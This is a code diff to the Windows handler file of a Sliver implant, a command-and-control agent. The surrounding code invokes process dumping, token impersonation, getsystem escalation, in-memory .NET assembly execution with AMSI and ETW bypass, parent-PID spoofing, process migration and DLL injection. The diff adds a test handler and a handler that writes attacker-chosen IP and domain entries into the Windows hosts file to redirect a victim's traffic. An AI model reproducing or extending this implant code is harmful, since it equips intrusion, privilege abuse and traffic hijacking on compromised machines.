@@ -26,9 +26,9 @@ import (
 	"os"
 	"runtime"
 
-	// {{if .Config.Debug}}
+	//
 	"log"
-	// {{end}}
+	//
 
 	"os/exec"
 	"syscall"
@@ -86,6 +86,8 @@ var (
 		sliverpb.MsgRegistryDeleteKeyReq:   regDeleteKeyHandler,
 		sliverpb.MsgRegistrySubKeysListReq: regSubKeysListHandler,
 		sliverpb.MsgRegistryListValuesReq:  regValuesListHandler,
+		sliverpb.MsgHelloWorldReq:          helloWorldHandler,
+		sliverpb.MsgModifyHostsFileReq:     modifyHostsFileHandler,
 
 		// Generic
 		sliverpb.MsgPing:           pingHandler,
@@ -114,15 +116,7 @@ var (
 		sliverpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
 		sliverpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,
 
-		// {{if .Config.WGc2Enabled}}
-		// Wireguard specific
-		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
-		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
-		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
-		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
-		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
-		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
-		// {{end}}
+		//
 	}
 )
 
@@ -135,9 +129,9 @@ func WrapperHandler(handler RPCHandler, data []byte, resp RPCResponse) {
 	if priv.CurrentToken != 0 {
 		err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
 		if err != nil {
-			// {{if .Config.Debug}}
+			//
 			log.Printf("Error: %v\n", err)
-			// {{end}}
+			//
 		}
 		runtime.LockOSThread()
 		defer runtime.UnlockOSThread()
@@ -146,9 +140,9 @@ func WrapperHandler(handler RPCHandler, data []byte, resp RPCResponse) {
 	if priv.CurrentToken != 0 {
 		err := priv.TRevertToSelf()
 		if err != nil {
-			// {{if .Config.Debug}}
+			//
 			log.Printf("Error: %v\n", err)
-			// {{end}}
+			//
 		}
 	}
 }
@@ -159,9 +153,9 @@ func dumpHandler(data []byte, resp RPCResponse) {
 	procDumpReq := &sliverpb.ProcessDumpReq{}
 	err := proto.Unmarshal(data, procDumpReq)
 	if err != nil {
-		// {{if .Config.Debug}}
+		//
 		log.Printf("error decoding message: %v", err)
-		// {{end}}
+		//
 		return
 	}
 	res, err := procdump.DumpProcess(procDumpReq.Pid)
@@ -180,9 +174,9 @@ func taskHandler(data []byte, resp RPCResponse) {
 	task := &sliverpb.TaskReq{}
 	err = proto.Unmarshal(data, task)
 	if err != nil {
-		// {{if .Config.Debug}}
+		//
 		log.Printf("error decoding message: %v", err)
-		// {{end}}
+		//
 		return
 	}
 
@@ -198,9 +192,9 @@ func impersonateHandler(data []byte, resp RPCResponse) {
 	impersonateReq := &sliverpb.ImpersonateReq{}
 	err := proto.Unmarshal(data, impersonateReq)
 	if err != nil {
-		// {{if .Config.Debug}}
+		//
 		log.Printf("error decoding message: %v", err)
-		// {{end}}
+		//
 		return
 	}
 	token, err := priv.Impersonate(impersonateReq.Username)
@@ -219,9 +213,9 @@ func runAsHandler(data []byte, resp RPCResponse) {
 	runAsReq := &sliverpb.RunAsReq{}
 	err := proto.Unmarshal(data, runAsReq)
 	if err != nil {
-		// {{if .Config.Debug}}
+		//
 		log.Printf("error decoding message: %v", err)
-		// {{end}}
+		//
 		return
 	}
 	show := 10
@@ -238,18 +232,18 @@ func runAsHandler(data []byte, resp RPCResponse) {
 }
 
 func revToSelfHandler(_ []byte, resp RPCResponse) {
-	//{{if .Config.Debug}}
+	//
 	log.Println("Calling revToSelf...")
-	//{{end}}
+	//
 	taskrunner.CurrentToken = windows.Token(0)
 	err := priv.RevertToSelf()
 	revToSelf := &sliverpb.RevToSelf{}
 	if err != nil {
 		revToSelf.Response = &commonpb.Response{Err: err.Error()}
 	}
-	//{{if .Config.Debug}}
+	//
 	log.Println("revToSelf done!")
-	//{{end}}
+	//
 	data, err := proto.Marshal(revToSelf)
 	resp(data, err)
 }
@@ -258,9 +252,9 @@ func currentTokenOwnerHandler(data []byte, resp RPCResponse) {
 	tokOwnReq := &sliverpb.CurrentTokenOwnerReq{}
 	err := proto.Unmarshal(data, tokOwnReq)
 	if err != nil {
-		// {{if .Config.Debug}}
+		//
 		log.Printf("error decoding message: %v", err)
-		// {{end}}
+		//
 		return
 	}
 
@@ -278,9 +272,9 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 	getSysReq := &sliverpb.InvokeGetSystemReq{}
 	err := proto.Unmarshal(data, getSysReq)
 	if err != nil {
-		// {{if .Config.Debug}}
+		//
 		log.Printf("error decoding message: %v", err)
-		// {{end}}
+		//
 		return
 	}
 	err = priv.GetSystem(getSysReq.Data, getSysReq.HostingProcess)
@@ -296,9 +290,9 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 	execReq := &sliverpb.InvokeExecuteAssemblyReq{}
 	err := proto.Unmarshal(data, execReq)
 	if err != nil {
-		// {{if .Config.Debug}}
+		//
 		log.Printf("error decoding message: %v", err)
-		// {{end}}
+		//
 		return
 	}
 	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process, execReq.ProcessArgs, execReq.PPid)
@@ -317,9 +311,9 @@ func inProcExecuteAssemblyHandler(data []byte, resp RPCResponse) {
 	execReq := &sliverpb.InvokeInProcExecuteAssemblyReq{}
 	err := proto.Unmarshal(data, execReq)
 	if err != nil {
-		// {{if .Config.Debug}}
+		//
 		log.Printf("error decoding message: %v", err)
-		// {{end}}
+		//
 		return
 	}
 	output, err := taskrunner.InProcExecuteAssembly(execReq.Data, execReq.Arguments, execReq.Runtime, execReq.AmsiBypass, execReq.EtwBypass)
@@ -344,9 +338,9 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 	execReq := &sliverpb.ExecuteWindowsReq{}
 	err = proto.Unmarshal(data, execReq)
 	if err != nil {
-		// {{if .Config.Debug}}
+		//
 		log.Printf("error decoding message: %v", err)
-		// {{end}}
+		//
 		return
 	}
 
@@ -372,9 +366,9 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 	if execReq.PPid != 0 {
 		err := spoof.SpoofParent(execReq.PPid, cmd)
 		if err != nil {
-			// {{if .Config.Debug}}
+			//
 			log.Printf("could not spoof parent PID: %v\n", err)
-			// {{end}}
+			//
 		}
 	}
 
@@ -414,9 +408,9 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 		cmd.Stdout = stdOut
 		cmd.Stderr = stdErr
 		err := cmd.Run()
-		//{{if .Config.Debug}}
+		//
 		log.Println(string(stdOutBuff.String()))
-		//{{end}}
+		//
 		if err != nil {
 			// Exit errors are not a failure of the RPC, but of the command.
 			if exiterr, ok := err.(*exec.ExitError); ok {
@@ -448,30 +442,30 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 }
 
 func migrateHandler(data []byte, resp RPCResponse) {
-	// {{if .Config.Debug}}
+	//
 	log.Println("migrateHandler: RemoteTask called")
-	// {{end}}
+	//
 	migrateReq := &sliverpb.InvokeMigrateReq{}
 	err := proto.Unmarshal(data, migrateReq)
 	if err != nil {
-		// {{if .Config.Debug}}
+		//
 		log.Printf("error decoding message: %v", err)
-		// {{end}}
+		//
 		return
 	}
 	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
-	// {{if .Config.Debug}}
+	//
 	log.Println("migrateHandler: RemoteTask called")
-	// {{end}}
+	//
 	migrateResp := &sliverpb.Migrate{Success: true}
 	if err != nil {
 		migrateResp.Success = false
 		migrateResp.Response = &commonpb.Response{
 			Err: err.Error(),
 		}
-		// {{if .Config.Debug}}
+		//
 		log.Println("migrateHandler: RemoteTask failed:", err)
-		// {{end}}
+		//
 	}
 	data, err = proto.Marshal(migrateResp)
 	resp(data, err)
@@ -482,14 +476,14 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 	err := proto.Unmarshal(data, spawnReq)
 
 	if err != nil {
-		// {{if .Config.Debug}}
+		//
 		log.Printf("error decoding message: %v", err)
-		// {{end}}
+		//
 		return
 	}
-	//{{if .Config.Debug}}
+	//
 	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
-	//{{end}}
+	//
 	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetProcessArgs(), spawnReq.GetPPid(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs(), spawnReq.Kill)
 	spawnResp := &sliverpb.SpawnDll{Result: result}
 	if err != nil {
@@ -805,4 +799,74 @@ func getUid(fileInfo os.FileInfo) string {
 // Stub since Windows doesn't support GID
 func getGid(fileInfo os.FileInfo) string {
 	return ""
+}
+
+func helloWorldHandler(data []byte, resp RPCResponse) {
+	helloworldReq := &sliverpb.HelloWorldReq{}
+	err := proto.Unmarshal(data, helloworldReq)
+
+	if err != nil {
+		//
+		log.Printf("error decoding message: %v", err)
+		//
+		return
+	}
+	//
+	helloworldResp := &sliverpb.HelloWorld{}
+	p3 := ""
+	if helloworldReq.Param3 {
+		p3 = "FALSE"
+	} else {
+		p3 = "TRUE"
+	}
+	helloworldResp.Output = fmt.Sprintf("I'm your implant and i received the following:\nparam1: %s\nparam2: %d\nparam3: %s",
+		helloworldReq.Param1, helloworldReq.Param2, p3)
+	//log.Printf("ping id = %d", ping.Nonce)
+	//
+	data, err = proto.Marshal(helloworldResp)
+	resp(data, err)
+}
+
+func modifyHostsFileHandler(data []byte, resp RPCResponse) {
+	modifyhostsfileReq := &sliverpb.ModifyHostsFileReq{}
+	err := proto.Unmarshal(data, modifyhostsfileReq)
+
+	if err != nil {
+		log.Printf("Error decoding message: %v", err)
+		return
+	}
+
+	// Get the domain name and IP address from the request
+	domainName := modifyhostsfileReq.DomainName
+	ipAddress := modifyhostsfileReq.Ipaddress
+
+	// Open the hosts file in append mode
+	file, err := os.OpenFile("C:\\Windows\\System32\\drivers\\etc\\hosts", os.O_APPEND|os.O_WRONLY, os.ModeAppend)
+	//file, err := os.OpenFile("C:\\Users\\jpure\\Downloads\\writeme.txt", os.O_APPEND|os.O_WRONLY, os.ModeAppend)
+	if err != nil {
+		log.Printf("Error opening hosts file: %v", err)
+		return
+	}
+	defer file.Close()
+
+	// Construct the line to be added to the hosts file
+	newLine := fmt.Sprintf("%s %s\n", ipAddress, domainName)
+
+	// Write the new line to the hosts file
+	_, err = file.WriteString(newLine)
+	if err != nil {
+		log.Printf("Error writing to hosts file: %v", err)
+		return
+	}
+
+	// Close the hosts file
+	file.Close()
+
+	// Prepare the response
+	modifyhostsfileResp := &sliverpb.ModifyHostsFile{}
+	modifyhostsfileResp.Output = fmt.Sprintf("Added the following entry to hosts file:\n%s", newLine)
+
+	// Marshal the response and send it
+	data, err = proto.Marshal(modifyhostsfileResp)
+	resp(data, err)
 }
